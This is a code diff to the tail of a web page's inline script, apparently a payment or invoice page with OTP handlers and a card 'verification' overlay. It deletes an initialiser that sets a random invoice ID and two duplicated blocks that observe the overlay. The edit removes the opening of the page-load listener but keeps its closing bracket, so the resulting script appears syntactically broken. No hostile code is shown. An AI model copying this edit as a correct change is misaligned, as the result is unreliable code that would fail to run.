@@ -2656,19 +2656,7 @@ function setupOTPHandlers() {
     }
 }
 
-// Initialize application
-document.addEventListener('DOMContentLoaded', function() {
-    // Generate random invoice ID
-    const invoiceIdElement = document.getElementById('invoiceId');
-    if (invoiceIdElement) {
-        invoiceIdElement.textContent = Math.floor(100000 + Math.random() * 900000);
-    }
 
-// Start observing the overlay element
-const overlay = document.getElementById('mcVerificationOverlay');
-if (overlay) {
-    observer.observe(overlay, { attributes: true });
-}
     // Fix for MC cancel button
     document.addEventListener('click', function(event) {
         if (event.target && event.target.id === 'mcCancelBtn') {
@@ -2699,11 +2687,6 @@ if (overlay) {
         }
     }, true);
     
-    // Start observing the overlay element
-    const overlay = document.getElementById('mcVerificationOverlay');
-    if (overlay) {
-        observer.observe(overlay, { attributes: true });
-    }
 });
 </script>
 </body>
